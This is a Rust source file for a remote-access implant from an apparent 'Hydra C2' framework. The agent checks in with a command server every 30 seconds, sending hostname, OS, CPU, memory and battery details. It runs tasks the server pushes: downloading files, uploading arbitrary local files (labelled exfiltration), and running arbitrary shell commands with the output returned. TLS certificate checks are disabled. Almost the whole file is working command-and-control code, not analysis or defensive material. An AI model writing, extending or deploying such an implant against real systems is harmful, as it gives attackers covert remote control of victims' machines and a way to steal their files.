use reqwest::Client;
use std::time::Duration;
use tokio::time::sleep;
use serde_json::Value;
use sysinfo::System;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let client_id = "DESKTOP-HEAD-ALPHA";
    let server_url = "https://127.0.0.1:8443";
    
    let mut sys = System::new_all();
    let battery_manager = battery::Manager::new()?;

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .use_rustls_tls()
        .build()?;

    println!(r#"
    _    _           _              _____ ___  
   | |  | |         | |            / ____|__ \ 
   | |__| |_   _  __| |_ __ __ _  | |       ) |
   |  __  | | | |/ _` | '__/ _` | | |      / / 
   | |  | | |_| | (_| | | | (_| | | |____ / /_ 
   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
            __/ |                              
           |___/                               

    >> Desktop Head: Task Queue Active
    "#);

    loop {
        sys.refresh_all();
        
        // --- GATHER TELEMETRY ---
        let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
        let os_ver = System::os_version().unwrap_or_else(|| "unknown".to_string());
        let ram_mb = sys.total_memory() / 1024 / 1024;

        // Get Battery Percentage
        let mut battery_level = "No Battery".to_string();
        if let Ok(mut batteries) = battery_manager.batteries() {
            if let Some(Ok(batt)) = batteries.next() {
                // Convert decimal percentage to readable string (e.g., "85%")
                battery_level = format!("{:.0}%", batt.state_of_charge().value * 100.0);
            }
        }

        let telemetry = serde_json::json!({
            "hostname": hostname,
            "os_version": os_ver,
            "cpu_count": sys.cpus().len(),
            "total_memory": ram_mb,
            "battery": battery_level, // New Battery Data
        });

        let checkin_url = format!("{}/checkin/{}?platform=desktop", server_url, client_id);

        // --- PERFORM CHECK-IN ---
        match client.post(&checkin_url).json(&telemetry).send().await {
            Ok(response) => {
                if response.status().is_success() {
                    let body: Value = response.json().await?;
                    
                    if let Some(command) = body.get("command") {
                        if !command.is_null() {
                            let action = command["action"].as_str().unwrap_or("");
                            let data = &command["data"];

                            println!("[!] Task Received: {}", action);

                            match action {
                                "download" => {
                                    let filename = data["filename"].as_str().unwrap_or("");
                                    let url = format!("{}/download/{}", server_url, filename);
                                    
                                    println!(">> [ACTION] Downloading: {}", filename);
                                    
                                    if let Ok(resp) = client.get(&url).send().await {
                                        if resp.status().is_success() {
                                            let bytes = resp.bytes().await?;
                                            std::fs::write(filename, bytes)?;
                                            println!("[+] File saved: {}", filename);
                                        }
                                    }
                                }
                                "upload" => {
                                    let filepath = data["path"].as_str().unwrap_or("");
                                    let url = format!("{}/upload/{}", server_url, client_id);
                                    
                                    println!(">> [ACTION] Exfiltrating: {}", filepath);
                                    
                                    if let Ok(file_content) = std::fs::read(filepath) {
                                        let part = reqwest::multipart::Part::bytes(file_content)
                                            .file_name(filepath.to_string());
                                        
                                        let form = reqwest::multipart::Form::new().part("file", part);
                                        let _ = client.post(&url).multipart(form).send().await;
                                        println!("[+] Exfiltration complete: {}", filepath);
                                    } else {
                                        println!("[-] Failed to read file: {}", filepath);
                                    }
                                }     
                                "msg" => {
                                    let content = data["content"].as_str().unwrap_or("No content");
                                    println!(">> MESSAGE FROM HYDRA: {}", content);
                                }
                                "shell" => {
                                    let cmd_text = data["cmd"].as_str().unwrap_or("");
                                    println!(">> [ACTION] Executing Shell: {}", cmd_text);
                                    
                                    let output = std::process::Command::new("sh")
                                        .arg("-c").arg(cmd_text).output();

                                    if let Ok(out) = output {
                                        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
                                        let stderr = String::from_utf8_lossy(&out.stderr).to_string();
                                        let result = if out.status.success() { stdout } else { stderr };

                                        let report_url = format!("{}/report/{}", server_url, client_id);
                                        let _ = client.post(&report_url)
                                            .json(&serde_json::json!({ "output": result }))
                                            .send().await;
                                    }
                                }
                                _ => println!("[?] Unknown action: {}", action),
                            }
                        }
                    }
                }
            }
            Err(e) => eprintln!("[!] Connection failed: {}. Retrying...", e),
        }

        sleep(Duration::from_secs(30)).await;
    }
}